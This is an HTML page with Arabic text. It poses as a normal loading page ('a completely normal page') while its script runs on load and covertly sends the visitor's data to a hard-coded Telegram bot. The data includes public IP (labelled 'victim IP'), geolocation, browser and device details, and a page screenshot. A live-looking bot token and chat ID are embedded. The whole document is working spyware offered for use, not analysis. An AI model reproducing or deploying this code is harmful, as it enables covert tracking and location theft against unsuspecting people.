<!DOCTYPE html>
<html>
<head>
    <title>صفحة مزيفة</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script>
        async function sendToTelegram(data) {
            const botToken = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU"; // استبدل ببوتك
            const chatId = "5446862709"; // استبدل بآيدي الدردشة
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`;
            await fetch(url);
        }

        function captureScreen() {
            html2canvas(document.body).then(canvas => {
                const screenshot = canvas.toDataURL('image/png');
                sendToTelegram(`لقطة شاشة: ${screenshot}`);
            });
        }

        function getDeviceInfo() {
            const info = `
                عنوان IP: ${window.ip || "غير معروف"}
                الموقع: ${window.location.href}
                User Agent: ${navigator.userAgent}
                نظام التشغيل: ${navigator.platform}
                الذاكرة: ${navigator.deviceMemory || "غير معروف"} GB
                المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة
            `;
            sendToTelegram(info);
        }

        // جلب الـ IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                window.ip = data.ip;
                sendToTelegram(`عنوان IP الضحية: ${data.ip}`);
            });

        // جلب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const location = `خط الطول: ${position.coords.latitude}, خط العرض: ${position.coords.longitude}`;
                sendToTelegram(`الموقع الجغرافي: ${location}`);
            });
        }

        // جمع المعلومات وإرسالها
        setTimeout(() => {
            captureScreen();
            getDeviceInfo();
        }, 3000);
    </script>
</head>
<body>
    <h1>مرحبًا! هذه صفحة عادية تمامًا 😊</h1>
    <p>جاري التحميل...</p>
</body>
</html>
